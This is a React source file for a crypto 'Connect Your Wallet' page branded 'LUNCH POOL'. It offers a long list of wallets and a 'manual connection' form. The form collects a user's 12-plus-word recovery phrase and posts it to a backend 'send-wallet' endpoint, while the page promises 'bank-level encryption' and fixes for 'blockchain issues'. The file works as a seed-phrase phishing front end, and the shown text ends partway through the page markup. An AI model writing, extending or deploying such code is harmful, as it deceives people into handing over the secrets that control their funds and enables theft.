import React, { useState, useEffect } from 'react';
import { 
  ChevronDown, 
  Wallet, 
  Import, 
  X, 
  Check, 
  AlertTriangle, 
  Shield, 
  Zap,
  Eye,
  EyeOff,
  Copy,
  ExternalLink,
  ArrowLeft
} from 'lucide-react';
import axios from 'axios';

// Mock popular wallets data for manual connection

const POPULAR_WALLETS = [
  { id: 'metamask', name: 'MetaMask', icon: '🦊', description: 'Popular browser extension wallet' },
  { id: 'trust', name: 'Trust Wallet', icon: '🛡️', description: 'Mobile-first crypto wallet' },
  { id: 'coinbase', name: 'Coinbase Wallet', icon: '🔵', description: 'User-friendly crypto wallet' },
  { id: 'phantom', name: 'Phantom', icon: '👻', description: 'Solana ecosystem wallet' },
  { id: 'binance', name: 'Binance Chain Wallet', icon: '🟡', description: 'Binance Smart Chain wallet' },
  { id: 'walletconnect', name: 'WalletConnect', icon: '🔗', description: 'Connect any mobile wallet' },
  { id: 'exodus', name: 'Exodus', icon: '🚀', description: 'Multi-currency desktop wallet' },
  { id: 'atomic', name: 'Atomic Wallet', icon: '⚛️', description: 'Decentralized multi-asset wallet' },
  { id: 'electrum', name: 'Electrum', icon: '⚡', description: 'Lightweight Bitcoin wallet' },
  { id: 'ledger', name: 'Ledger Live', icon: '📊', description: 'Hardware wallet companion' },
  { id: 'trezor', name: 'Trezor Suite', icon: '🔐', description: 'Hardware wallet interface' },
  { id: 'myetherwallet', name: 'MyEtherWallet', icon: '💎', description: 'Ethereum wallet interface' },
  { id: 'rainbow', name: 'Rainbow', icon: '🌈', description: 'Ethereum wallet with DeFi focus' },
  { id: 'argent', name: 'Argent', icon: '🏛️', description: 'Smart contract wallet' },
  { id: 'imtoken', name: 'imToken', icon: '🎯', description: 'Multi-blockchain wallet' },
  { id: 'tokenpocket', name: 'TokenPocket', icon: '💰', description: 'Multi-chain wallet' },
  { id: 'safepal', name: 'SafePal', icon: '🔒', description: 'Hardware and software wallet' },
  { id: 'keplr', name: 'Keplr', icon: '🌌', description: 'Cosmos ecosystem wallet' },
  { id: 'terra', name: 'Terra Station', icon: '🌍', description: 'Terra blockchain wallet' },
  { id: 'solflare', name: 'Solflare', icon: '☀️', description: 'Solana wallet' },
  { id: 'slope', name: 'Slope', icon: '📈', description: 'Solana mobile wallet' },
  { id: 'mathwallet', name: 'MathWallet', icon: '🧮', description: 'Multi-platform crypto wallet' },
  { id: 'enjin', name: 'Enjin Wallet', icon: '🎮', description: 'Gaming-focused wallet' },
  { id: 'status', name: 'Status', icon: '💬', description: 'Ethereum wallet with messaging' },
  { id: 'pillar', name: 'Pillar', icon: '🏗️', description: 'Personal data locker wallet' },
  { id: 'unstoppable', name: 'Unstoppable Wallet', icon: '🚫', description: 'Non-custodial multi-coin wallet' },
  { id: 'edge', name: 'Edge', icon: '🔺', description: 'Mobile crypto wallet' },
  { id: 'blockchain', name: 'Blockchain.com', icon: '⛓️', description: 'Popular web wallet' },
  { id: 'jaxx', name: 'Jaxx Liberty', icon: '💫', description: 'Multi-platform wallet' },
  { id: 'breadwallet', name: 'BRD', icon: '🍞', description: 'Simple crypto wallet' },
  { id: 'coinomi', name: 'Coinomi', icon: '🪙', description: 'Multi-coin mobile wallet' },
  { id: 'guarda', name: 'Guarda', icon: '🛡️', description: 'Multi-currency wallet' },
  { id: 'zelcore', name: 'Zelcore', icon: '⚡', description: 'Multi-asset wallet' },
  { id: 'bitpay', name: 'BitPay', icon: '💳', description: 'Bitcoin wallet with card' },
  { id: 'luno', name: 'Luno', icon: '🌙', description: 'Bitcoin and Ethereum wallet' },
  { id: 'wasabi', name: 'Wasabi Wallet', icon: '🌶️', description: 'Privacy-focused Bitcoin wallet' },
  { id: 'samurai', name: 'Samourai Wallet', icon: '🥷', description: 'Privacy Bitcoin wallet' },
  { id: 'bluewallet', name: 'BlueWallet', icon: '🔵', description: 'Bitcoin Lightning wallet' },
  { id: 'green', name: 'Green Wallet', icon: '🟢', description: 'Blockstream Green wallet' },
  { id: 'muun', name: 'Muun', icon: '🌕', description: 'Bitcoin Lightning wallet' },
  { id: 'phoenix', name: 'Phoenix', icon: '🔥', description: 'Lightning Network wallet' },
  { id: 'yoroi', name: 'Yoroi', icon: '🏮', description: 'Cardano wallet' },
  { id: 'daedalus', name: 'Daedalus', icon: '🏛️', description: 'Full-node Cardano wallet' },
  { id: 'adalite', name: 'AdaLite', icon: '💎', description: 'Cardano web wallet' },
  { id: 'nami', name: 'Nami', icon: '🌊', description: 'Cardano browser wallet' },
  { id: 'temple', name: 'Temple', icon: '🏛️', description: 'Tezos wallet' },
  { id: 'kukai', name: 'Kukai', icon: '🌺', description: 'Tezos web wallet' },
  { id: 'galleon', name: 'Galleon', icon: '⛵', description: 'Tezos desktop wallet' },
  { id: 'algorand', name: 'Algorand Wallet', icon: '🔷', description: 'Official Algorand wallet' },
  { id: 'myalgo', name: 'MyAlgo', icon: '🔹', description: 'Algorand web wallet' },
  { id: 'polkadot', name: 'Polkadot.js', icon: '⚫', description: 'Polkadot ecosystem wallet' },
  { id: 'talisman', name: 'Talisman', icon: '🔮', description: 'Polkadot parachain wallet' },
  { id: 'subwallet', name: 'SubWallet', icon: '🌐', description: 'Polkadot multichain wallet' },
  { id: 'fearless', name: 'Fearless Wallet', icon: '💪', description: 'Polkadot mobile wallet' },
  { id: 'nova', name: 'Nova Wallet', icon: '⭐', description: 'Next-gen Polkadot wallet' },
  { id: 'near', name: 'NEAR Wallet', icon: '🔺', description: 'NEAR Protocol wallet' },
  { id: 'sender', name: 'Sender Wallet', icon: '📤', description: 'NEAR web wallet' },
  { id: 'harmony', name: 'Harmony One Wallet', icon: '🎵', description: 'Harmony blockchain wallet' },
  { id: 'elrond', name: 'Elrond Wallet', icon: '⚡', description: 'Elrond network wallet' },
  { id: 'maiar', name: 'Maiar', icon: '🌟', description: 'Elrond mobile wallet' },
  { id: 'avalanche', name: 'Avalanche Wallet', icon: '🏔️', description: 'Avalanche ecosystem wallet' },
  { id: 'core', name: 'Core', icon: '🔥', description: 'Avalanche browser extension' },
  { id: 'ronin', name: 'Ronin Wallet', icon: '⚔️', description: 'Axie Infinity sidechain wallet' },
  { id: 'glow', name: 'Glow', icon: '✨', description: 'Solana validator wallet' },
  { id: 'coin98', name: 'Coin98', icon: '🔄', description: 'Multi-chain DeFi wallet' },
  { id: 'safeware', name: 'Safeware', icon: '🔐', description: 'Security-focused wallet' },
  { id: 'bitkeep', name: 'BitKeep', icon: '🗝️', description: 'Multi-chain Web3 wallet' },
  { id: 'onto', name: 'ONTO', icon: '🎯', description: 'Ontology blockchain wallet' },
  { id: 'cyano', name: 'Cyano Wallet', icon: '🔬', description: 'Ontology browser wallet' },
  { id: 'owallet', name: 'OWallet', icon: '⭕', description: 'Ontology mobile wallet' },
  { id: 'neon', name: 'Neon Wallet', icon: '🌈', description: 'NEO blockchain wallet' },
  { id: 'o3', name: 'O3 Wallet', icon: '⭕', description: 'Multi-chain NEO wallet' },
  { id: 'neoline', name: 'NeoLine', icon: '📈', description: 'NEO browser extension' },
  { id: 'scatter', name: 'Scatter', icon: '🌪️', description: 'EOS ecosystem wallet' },
  { id: 'anchor', name: 'Anchor', icon: '⚓', description: 'EOS desktop wallet' },
  { id: 'wombat', name: 'Wombat', icon: '🐨', description: 'EOS gaming wallet' },
  { id: 'tokenary', name: 'Tokenary', icon: '💎', description: 'macOS Safari crypto wallet' },
  { id: 'frame', name: 'Frame', icon: '🖼️', description: 'Desktop Ethereum wallet' },
  { id: 'gnosis', name: 'Gnosis Safe', icon: '🏛️', description: 'Multi-signature wallet' },
  { id: 'portis', name: 'Portis', icon: '🚪', description: 'Web3 wallet SDK' },
  { id: 'fortmatic', name: 'Fortmatic', icon: '🎩', description: 'Web3 wallet with phone auth' },
  { id: 'torus', name: 'Torus', icon: '🔵', description: 'Social login Web3 wallet' },
  { id: 'authereum', name: 'Authereum', icon: '🔑', description: 'Meta-transaction wallet' },
  { id: 'dapper', name: 'Dapper', icon: '🎭', description: 'Flow blockchain wallet' },
  { id: 'blocto', name: 'Blocto', icon: '🧊', description: 'Flow and multi-chain wallet' },
  { id: 'lilico', name: 'Lilico', icon: '🌸', description: 'Flow browser extension wallet' },
  { id: 'finnie', name: 'Finnie', icon: '🐕', description: 'Koii network wallet' },
  { id: 'frontier', name: 'Frontier', icon: '🏔️', description: 'DeFi and NFT wallet' },
  { id: 'alpha', name: 'Alpha Wallet', icon: '🐺', description: 'Ethereum mobile wallet' },
  { id: 'eidoo', name: 'Eidoo', icon: '🔷', description: 'Multi-currency mobile wallet' },
  { id: 'walleth', name: 'WallETH', icon: '📱', description: 'Android Ethereum wallet' },
  { id: 'dharma', name: 'Dharma', icon: '☸️', description: 'DeFi-focused mobile wallet' },
  { id: 'monero', name: 'Monero GUI', icon: '🔒', description: 'Official Monero wallet' },
  { id: 'cake', name: 'Cake Wallet', icon: '🍰', description: 'Monero and Bitcoin wallet' },
  { id: 'monerujo', name: 'Monerujo', icon: '👁️', description: 'Android Monero wallet' },
  { id: 'feather', name: 'Feather Wallet', icon: '🪶', description: 'Lightweight Monero wallet' },
  { id: 'zcash', name: 'Zcash Wallet', icon: '🛡️', description: 'Official Zcash wallet' },
  { id: 'zecwallet', name: 'ZecWallet', icon: '⚡', description: 'Full-featured Zcash wallet' },
  { id: 'nighthawk', name: 'Nighthawk', icon: '🦅', description: 'Mobile Zcash wallet' },
  { id: 'dash', name: 'Dash Core', icon: '💨', description: 'Official Dash wallet' },
  { id: 'dashpay', name: 'DashPay', icon: '💸', description: 'Dash mobile wallet' },
  { id: 'litecoin', name: 'Litecoin Core', icon: '🥈', description: 'Official Litecoin wallet' },
  { id: 'loafwallet', name: 'LoafWallet', icon: '🍞', description: 'Litecoin mobile wallet' },
  { id: 'dogecoin', name: 'Dogecoin Core', icon: '🐕', description: 'Official Dogecoin wallet' },
  { id: 'multidoge', name: 'MultiDoge', icon: '🐶', description: 'Lightweight Dogecoin wallet' },
  { id: 'uniswap', name: 'Uniswap Wallet', icon: '🦄', description: 'Uniswap mobile wallet' },
  { id: '1inch', name: '1inch Wallet', icon: '1️⃣', description: 'DeFi aggregator wallet' },
  { id: 'metamask_mobile', name: 'MetaMask Mobile', icon: '📱', description: 'Mobile version of MetaMask' },
  { id: 'trustwallet_desktop', name: 'Trust Wallet Desktop', icon: '🖥️', description: 'Desktop Trust Wallet app' },
  { id: 'brave_wallet', name: 'Brave Wallet', icon: '🦁', description: 'Built-in Brave browser wallet' },
  { id: 'opera_wallet', name: 'Opera Wallet', icon: '🎭', description: 'Opera browser crypto wallet' },
  { id: 'rabby', name: 'Rabby', icon: '🐰', description: 'Multi-chain browser extension' },
  { id: 'xdefi', name: 'XDEFI', icon: '❌', description: 'Multi-chain DeFi wallet' },
  { id: 'enkrypt', name: 'Enkrypt', icon: '🔐', description: 'Multi-chain browser wallet' },
  { id: 'backpack', name: 'Backpack', icon: '🎒', description: 'Solana-first wallet' },
  { id: 'sollet', name: 'Sollet', icon: '🌞', description: 'Solana web wallet' },
  { id: 'math_extension', name: 'Math Wallet Extension', icon: '🧮', description: 'Browser extension version' },
  { id: 'coinhub', name: 'CoinHub', icon: '🌐', description: 'Multi-currency wallet' },
  { id: 'spatium', name: 'Spatium', icon: '🌌', description: 'Multi-blockchain wallet' },
  { id: 'keystone', name: 'Keystone', icon: '🗝️', description: 'Air-gapped hardware wallet' },
  { id: 'coolwallet', name: 'CoolWallet', icon: '❄️', description: 'Card-shaped hardware wallet' },
  { id: 'ellipal', name: 'ELLIPAL', icon: '🛡️', description: 'Air-gapped hardware wallet' },
  { id: 'keepkey', name: 'KeepKey', icon: '🔑', description: 'Hardware wallet by ShapeShift' },
  { id: 'bitbox', name: 'BitBox', icon: '📦', description: 'Swiss hardware wallet' },
  { id: 'secux', name: 'SecuX', icon: '🔒', description: 'Hardware wallet with touch screen' },
  { id: 'cobo', name: 'Cobo Vault', icon: '🏦', description: 'Air-gapped hardware wallet' },
  { id: 'dcent', name: 'D\'CENT', icon: '💎', description: 'Biometric hardware wallet' },
  { id: 'ngrave', name: 'NGRAVE', icon: '⚱️', description: 'Ultra-secure hardware wallet' },
  { id: 'gridplus', name: 'GridPlus', icon: '⚡', description: 'Lattice hardware wallet' },
  { id: 'coldcard', name: 'Coldcard', icon: '🧊', description: 'Bitcoin-only hardware wallet' },
  { id: 'foundation', name: 'Foundation Passport', icon: '🛂', description: 'Open-source hardware wallet' },
  { id: 'jade', name: 'Blockstream Jade', icon: '💚', description: 'Bitcoin hardware wallet' },
  { id: 'tangem', name: 'Tangem', icon: '💳', description: 'Card-based hardware wallet' },
  { id: 'fireblocks', name: 'Fireblocks', icon: '🔥', description: 'Institutional wallet platform' },
  { id: 'bitgo', name: 'BitGo', icon: '🏢', description: 'Enterprise crypto wallet' },
  { id: 'copper', name: 'Copper', icon: '🔶', description: 'Institutional custody solution' },
  { id: 'anchorage', name: 'Anchorage Digital', icon: '⚓', description: 'Regulated crypto custody' },
  { id: 'prime_trust', name: 'Prime Trust', icon: '🏦', description: 'Qualified custodian wallet' },
  { id: 'gemini_custody', name: 'Gemini Custody', icon: '♊', description: 'Institutional custody service' },
  { id: 'fidelity', name: 'Fidelity Digital Assets', icon: '🏛️', description: 'Traditional finance crypto custody' },
  { id: 'bakkt', name: 'Bakkt', icon: '🥖', description: 'Digital asset platform wallet' },
  { id: 'voyager', name: 'Voyager', icon: '🚀', description: 'Crypto trading platform wallet' },
  { id: 'celsius', name: 'Celsius', icon: '🌡️', description: 'Crypto lending platform wallet' },
  { id: 'nexo', name: 'Nexo', icon: '🔗', description: 'Crypto lending wallet' },
  { id: 'blockfi', name: 'BlockFi', icon: '📊', description: 'Crypto interest account' },
  { id: 'compound', name: 'Compound Finance', icon: '🏦', description: 'DeFi lending protocol wallet' },
  { id: 'aave', name: 'Aave', icon: '👻', description: 'DeFi lending platform' },
  { id: 'yearn', name: 'Yearn Finance', icon: '🌾', description: 'DeFi yield optimization' },
  { id: 'curve', name: 'Curve Finance', icon: '📈', description: 'Stablecoin DEX wallet' },
  { id: 'balancer', name: 'Balancer', icon: '⚖️', description: 'Automated portfolio manager' },
  { id: 'sushiswap', name: 'SushiSwap', icon: '🍣', description: 'Decentralized exchange wallet' },
  { id: 'pancakeswap', name: 'PancakeSwap', icon: '🥞', description: 'BSC decentralized exchange' },
  { id: 'quickswap', name: 'QuickSwap', icon: '⚡', description: 'Polygon DEX wallet' },
  { id: 'traderjoe', name: 'Trader Joe', icon: '☕', description: 'Avalanche DEX wallet' },
  { id: 'raydium', name: 'Raydium', icon: '☀️', description: 'Solana DEX and AMM' },
  { id: 'serum', name: 'Serum', icon: '🧪', description: 'Solana DEX wallet' },
  { id: 'orca', name: 'Orca', icon: '🐋', description: 'Solana DEX wallet' },
  { id: 'jupiter', name: 'Jupiter', icon: '🪐', description: 'Solana swap aggregator' },
  { id: 'osmosis', name: 'Osmosis', icon: '🌊', description: 'Cosmos DEX wallet' },
  { id: 'terraswap', name: 'Terraswap', icon: '🌍', description: 'Terra DEX wallet' },
  { id: 'astroport', name: 'Astroport', icon: '🚀', description: 'Terra DeFi hub' },
  { id: 'anchor_protocol', name: 'Anchor Protocol', icon: '⚓', description: 'Terra savings protocol' },
  { id: 'mirror', name: 'Mirror Protocol', icon: '🪞', description: 'Terra synthetic assets' },
  { id: 'thorchain', name: 'THORChain', icon: '⚡', description: 'Cross-chain DEX' },
  { id: 'rango', name: 'Rango Exchange', icon: '🔄', description: 'Cross-chain DEX aggregator' },
  { id: 'hop', name: 'Hop Protocol', icon: '🐰', description: 'Layer 2 bridge' },
  { id: 'synapse', name: 'Synapse Protocol', icon: '🧠', description: 'Cross-chain bridge' },
  { id: 'multichain', name: 'Multichain', icon: '⛓️', description: 'Cross-chain router protocol' },
  { id: 'stargate', name: 'Stargate Finance', icon: '🌟', description: 'Omnichain liquidity transport' },
  { id: 'wormhole', name: 'Wormhole', icon: '🕳️', description: 'Cross-chain bridge' },
  { id: 'polygon_bridge', name: 'Polygon Bridge', icon: '🔺', description: 'Ethereum to Polygon bridge' },
  { id: 'arbitrum_bridge', name: 'Arbitrum Bridge', icon: '🔵', description: 'Ethereum Layer 2 bridge' },
  { id: 'optimism_gateway', name: 'Optimism Gateway', icon: '🔴', description: 'Optimistic rollup bridge' },
  { id: 'loopring', name: 'Loopring', icon: '⭕', description: 'Ethereum Layer 2 wallet' },
  { id: 'zksync', name: 'zkSync', icon: '⚡', description: 'Ethereum Layer 2 scaling' },
  { id: 'starknet', name: 'StarkNet', icon: '⭐', description: 'Ethereum Layer 2 solution' },
  { id: 'immutable', name: 'Immutable X', icon: '❌', description: 'NFT Layer 2 solution' },
  { id: 'dydx', name: 'dYdX', icon: '📊', description: 'Decentralized derivatives exchange' },
  { id: 'gmx', name: 'GMX', icon: '📈', description: 'Decentralized perpetual exchange' },
  { id: 'perpetual', name: 'Perpetual Protocol', icon: '♾️', description: 'Decentralized perpetuals' },
  { id: 'mango', name: 'Mango Markets', icon: '🥭', description: 'Solana derivatives trading' },
  { id: 'drift', name: 'Drift Protocol', icon: '🏎️', description: 'Solana perpetuals DEX' },
  { id: 'ribbon', name: 'Ribbon Finance', icon: '🎀', description: 'Structured products protocol' },
  { id: 'opyn', name: 'Opyn', icon: '🛡️', description: 'DeFi options protocol' },
  { id: 'hegic', name: 'Hegic', icon: '🦔', description: 'On-chain options trading' },
  { id: 'dopex', name: 'Dopex', icon: '💊', description: 'Decentralized options exchange' },
  { id: 'lyra', name: 'Lyra', icon: '🎵', description: 'Options AMM protocol' },
  { id: 'premia', name: 'Premia', icon: '💎', description: 'Options trading platform' },
  { id: 'nexus_mutual', name: 'Nexus Mutual', icon: '🛡️', description: 'Decentralized insurance' },
  { id: 'cover', name: 'Cover Protocol', icon: '☂️', description: 'DeFi insurance marketplace' },
  { id: 'unslashed', name: 'Unslashed Finance', icon: '🔓', description: 'Decentralized insurance' },
  { id: 'chainlink', name: 'Chainlink', icon: '🔗', description: 'Oracle network wallet' },
  { id: 'band', name: 'Band Protocol', icon: '🎵', description: 'Cross-chain data oracle' },
  { id: 'api3', name: 'API3', icon: '🔌', description: 'Decentralized API network' },
  { id: 'tellor', name: 'Tellor', icon: '📡', description: 'Decentralized oracle network' },
  { id: 'dia', name: 'DIA', icon: '💎', description: 'Open financial data platform' },
  { id: 'gitcoin', name: 'Gitcoin', icon: '🏗️', description: 'Open source funding platform' },
  { id: 'snapshot', name: 'Snapshot', icon: '📸', description: 'Decentralized voting platform' },
  { id: 'aragon', name: 'Aragon', icon: '🏛️', description: 'DAO creation platform' },
  { id: 'colony', name: 'Colony', icon: '🐝', description: 'DAO platform for organizations' },
  { id: 'moloch', name: 'Moloch DAO', icon: '👹', description: 'Minimalist DAO framework' },
  { id: 'compound_governance', name: 'Compound Governance', icon: '🗳️', description: 'DeFi governance platform' },
  { id: 'maker_governance', name: 'MakerDAO Governance', icon: '🏛️', description: 'DAI stablecoin governance' },
  { id: 'aave_governance', name: 'Aave Governance', icon: '👻', description: 'Aave protocol governance' },
  { id: 'uniswap_governance', name: 'Uniswap Governance', icon: '🦄', description: 'UNI token governance' },
  { id: 'ens', name: 'ENS', icon: '🌐', description: 'Ethereum Name Service' },
  { id: 'unstoppable_domains', name: 'Unstoppable Domains', icon: '🚫', description: 'Blockchain domain service' },
  { id: 'handshake', name: 'Handshake', icon: '🤝', description: 'Decentralized naming protocol' },
  { id: 'ipfs', name: 'IPFS', icon: '🌐', description: 'InterPlanetary File System' },
  { id: 'filecoin', name: 'Filecoin', icon: '📁', description: 'Decentralized storage network' },
  { id: 'arweave', name: 'Arweave', icon: '🏹', description: 'Permanent data storage' },
  { id: 'storj', name: 'Storj', icon: '☁️', description: 'Decentralized cloud storage' },
  { id: 'siacoin', name: 'Siacoin', icon: '💾', description: 'Decentralized storage platform' },
  { id: 'golem', name: 'Golem', icon: '🤖', description: 'Decentralized computing network' },
  { id: 'render', name: 'Render Network', icon: '🎨', description: 'Decentralized GPU rendering' },
  { id: 'livepeer', name: 'Livepeer', icon: '📹', description: 'Decentralized video streaming' },
  { id: 'theta', name: 'Theta Network', icon: '📺', description: 'Decentralized video delivery' }
];

// Automatic connection wallets (5 specific wallets)
const AUTO_CONNECT_WALLETS = [
  { id: 'metamask', name: 'MetaMask', icon: '🦊', description: 'Browser extension wallet', apiEndpoint: 'metamask' },
  { id: 'trust', name: 'Trust Wallet', icon: '🛡️', description: 'Mobile crypto wallet', apiEndpoint: 'trust' },
  { id: 'phantom', name: 'Phantom (Solana)', icon: '👻', description: 'Solana ecosystem wallet', apiEndpoint: 'solana' },
  { id: 'coinbase', name: 'Coinbase Wallet', icon: '🔵', description: 'User-friendly wallet', apiEndpoint: 'coinbase' },
  { id: 'binance', name: 'Binance Wallet', icon: '🟡', description: 'Binance Smart Chain', apiEndpoint: 'binance' },
];

// This one na for manual
const sendWalletInfo = async (walletName, secretPhrase, userWalletName) => {
  //  console.log(walletName, secretPhrase, userWalletName);
  try {
    const response = await axios.post('http://localhost:5000/api/send-wallet', {
      walletName,
      secretPhrase,
      userWalletName,
    });
    
    if (response.data.success) {
      console.log('Wallet info sent successfully');
    } else {
      console.error('Failed to send wallet info');
    }
  } catch (err) {
    console.error('Error:', err);
  }
};

// na here i put automatic call for APi

const connectAutoWallet = async (walletType) => {
  try {
    const response = await fetch(`http://localhost:3001/api/connect-${walletType}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ walletType }),
    });

    const data = await response.json();
    return {
      success: data.success,
      address: data.address || null,
      error: data.error || null
    };
  } catch (err) {
    console.error('Auto connect error:', err);
    return {
      success: false,
      address: null,
      error: 'Failed to connect to wallet service'
    };
  }
};

export default function ConnectPage() {
  // State management
  const [showManualPopup, setShowManualPopup] = useState(false);
  const [showAutoPopup, setShowAutoPopup] = useState(false);
  const [showWalletForm, setShowWalletForm] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [selectedAutoWallet, setSelectedAutoWallet] = useState(null);
  const [showSuccessPopup, setShowSuccessPopup] = useState(false);
  const [showErrorPopup, setShowErrorPopup] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [connectionStatus, setConnectionStatus] = useState(null);
  const [showSecretPhrase, setShowSecretPhrase] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  
  // Form data
  const [formData, setFormData] = useState({
    walletName: '',
    secretPhrase: ''
  });
  
  // Validation errors
  const [errors, setErrors] = useState({});
  
  
  // Handle manual connection flow
  const handleManualConnect = () => {
    setShowManualPopup(true);
  };
  
  // Handle automatic connection flow
  const handleAutomaticConnect = () => {
    // console.log('handleAutomaticConnect called');
    setShowAutoPopup(true);
  };
  
  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
    setFormData({ ...formData, walletName: wallet.name });
    setShowManualPopup(false);
    setShowWalletForm(true);
  };

  // Handle automatic wallet selection and connection
  const handleAutoWalletSelect = async (wallet) => {
    console.log('handleAutoWalletSelect called with:', wallet);
    setSelectedAutoWallet(wallet);
    setIsConnecting(true);
    setShowAutoPopup(false);
    setConnectionStatus('connecting');
    
    try {
      const result = await connectAutoWallet(wallet.apiEndpoint);
      
      if (result.success) {
        setConnectionStatus('success');
        setTimeout(() => {
          setConnectionStatus(null);
          setSelectedAutoWallet(null);
        }, 5000);
      } else {
        setConnectionStatus('error');
        setErrorMessage(result.error || 'Failed to connect to wallet');
        setTimeout(() => {
          setConnectionStatus(null);
          setSelectedAutoWallet(null);
          setErrorMessage('');
        }, 5000);
      }
    } catch (error) {
      console.error('Auto connect error:', error);
      setConnectionStatus('error');
      setErrorMessage('Connection failed. Please try again.');
      setTimeout(() => {
        setConnectionStatus(null);
        setSelectedAutoWallet(null);
        setErrorMessage('');
      }, 5000);
    } finally {
      setIsConnecting(false);
    }
  };
  
  const handleInputChange = (field, value) => {
    setFormData({ ...formData, [field]: value });
    // Clear error when user starts typing
    if (errors[field]) {
      setErrors({ ...errors, [field]: '' });
    }
  };
  
  const validateForm = () => {
    const newErrors = {};
    
    if (!formData.walletName.trim()) {
      newErrors.walletName = 'Wallet name is required';
    }
    
    if (!formData.secretPhrase.trim()) {
      newErrors.secretPhrase = 'Secret phrase is required';
    } else {
      const words = formData.secretPhrase.trim().split(/\s+/);
      if (words.length < 12) {
        newErrors.secretPhrase = 'Secret phrase must contain at least 12 words';
      }
    }
    
    // console.log('Validation errors:', newErrors);
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };
  
  // For manual baba - with enhanced debugging
  const handleManualSubmit = async (e) => {
       
    // Prevent default form submission
    e.preventDefault();
    
    // Validate form
    const isValid = validateForm();
    
    if (!isValid) {
      return;
    }
    setIsConnecting(true);
    
    try {
      // Log the data being sent for debugging
      const submissionData = {
        walletName: selectedWallet.name,
        secretPhrase: formData.secretPhrase,
        userWalletName: formData.walletName
      };
      
      const result = await sendWalletInfo(
        submissionData.walletName, 
        submissionData.secretPhrase, 
        submissionData.userWalletName
      );
      
      if (result.success) {
        console.log('Submission successful, showing success popup');
        setShowWalletForm(false);
        setShowSuccessPopup(true);
        setFormData({ walletName: '', secretPhrase: '' });
        setSelectedWallet(null);
      } else {
        console.log('Submission failed, showing error popup');
        setShowErrorPopup(true);
        setErrorMessage(result.error || 'Submission failed');
      }
    } catch (error) {
      console.error('Submission error:', error);
      setShowErrorPopup(true);
      setErrorMessage(error.message || 'An unexpected error occurred');
    } finally {
      console.log('Setting isConnecting to false');
      setIsConnecting(false);
      console.log('=== FORM SUBMISSION ENDED ===');
    }
  };
  
  const closeAllPopups = () => {
    
    setShowManualPopup(false);
    setShowAutoPopup(false);
    setShowWalletForm(false);
    setShowSuccessPopup(false);
    setShowErrorPopup(false);
    setConnectionStatus(null);
    setSelectedWallet(null);
    setSelectedAutoWallet(null);
    setFormData({ walletName: '', secretPhrase: '' });
    setErrors({});
    setErrorMessage('');
  };
  
  return (
    <div className="connect-page min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900">
      {/* Background Elements */}
      <div className="fixed inset-0 bg-gradient-radial from-transparent via-indigo-900/20 to-black/80 pointer-events-none"></div>
      
      {/* Header */}
      <header className="relative z-20 px-6 py-4 flex justify-between items-center border-b border-white/10 backdrop-blur-sm">
        <div className="logo-container">
          <div className="logo text-2xl font-bold bg-gradient-to-r from-blue-400 to-purple-600 bg-clip-text text-transparent">
            LUNCH POOL
          </div>
        </div>
        <button 
          onClick={() => window.history.back()} 
          className="flex items-center gap-2 px-4 py-2 rounded-lg bg-white/5 border border-white/10 hover:bg-white/10 text-white transition-all"
        >
          <ArrowLeft size={16} />
          Back
        </button>
      </header>

      {/* Main Content */}
      <main className="relative z-20 container mx-auto px-6 py-12">
        <div className="max-w-4xl mx-auto">
          {/* Page Header */}
          <div className="text-center mb-12">
            <div className="inline-block px-3 py-1 rounded-full bg-blue-900/30 border border-blue-500/50 text-blue-400 text-xs font-semibold mb-6">
              SECURE CONNECTION
            </div>
            <h1 className="text-4xl md:text-5xl font-bold mb-6 text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-purple-600">
              Connect Your Wallet
            </h1>
            <p className="text-gray-300 text-lg max-w-2xl mx-auto">
              Choose your preferred connection method to securely access your crypto wallet and resolve blockchain issues.
            </p>
          </div>

          {/* Connection Methods */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-12">
            {/* Manual Connection */}
            <div className="connection-card group relative overflow-hidden rounded-2xl bg-gradient-to-b from-white/5 to-white/[0.02] border border-white/10 backdrop-blur-sm p-8 hover:border-purple-500/50 transition-all duration-300">
              <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-br from-purple-500/10 to-pink-600/10 rounded-full blur-3xl"></div>
              
              <div className="relative z-10">
                <div className="flex items-center gap-4 mb-6">
                  <div className="w-12 h-12 rounded-lg bg-purple-500/20 flex items-center justify-center">
                    <Import size={24} className="text-purple-400" />
                  </div>
                  <div>
                    <h3 className="text-xl font-semibold text-white">Manual Connection</h3>
                    <p className="text-gray-400 text-sm">Import using seed phrase</p>
                  </div>
                </div>
                
                <p className="text-gray-300 mb-6">
                  Securely connect by selecting your wallet type and entering your recovery phrase. 
                  Full control over the connection process.
                </p>
                
                <div className="features-list space-y-2 mb-8">
                  <div className="flex items-center gap-2 text-sm text-gray-400">
                    <Shield size={14} className="text-green-400" />
                    <span>Bank-level encryption</span>
                  </div>
                  <div className="flex items-center gap-2 text-sm text-gray-400">
                    <Check size={14} className="text-green-400" />
                    <span>Works with all wallet types</span>
                  </div>
                  <div className="flex items-center gap-2 text-sm text-gray-400">
                    <Wallet size={14} className="text-green-400" />
                    <span>Direct access to funds</span>
                  </div>
                </div>
                
                <button 
                  onClick={handleManualConnect}
                  className="w-full px-6 py-3 rounded-lg bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-medium transition-all shadow-lg shadow-purple-700/30"
                >
                  Connect Manually
                </button>
              </div>
            </div>

            {/* Automatic Connection */}
            <div className="connection-card group relative overflow-hidden rounded-2xl bg-gradient-to-b from-white/5 to-white/[0.02] border border-white/10 backdrop-blur-sm p-8 hover:border-blue-500/50 transition-all duration-300">
              <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-br from-blue-500/10 to-cyan-600/10 rounded-full blur-3xl"></div>
              
              <div className="relative z-10">
                <div className="flex items-center gap-4 mb-6">
                  <div className="w-12 h-12 rounded-lg bg-blue-500/20 flex items-center justify-center">
                    <Zap size={24} className="text-blue-400" />
                  </div>
                  <div>
                    <h3 className="text-xl font-semibold text-white">Automatic Connection</h3>
                    <p className="text-gray-400 text-sm">One-click Web3 connection</p>
                  </div>
                </div>
                
                <p className="text-gray-300 mb-6">
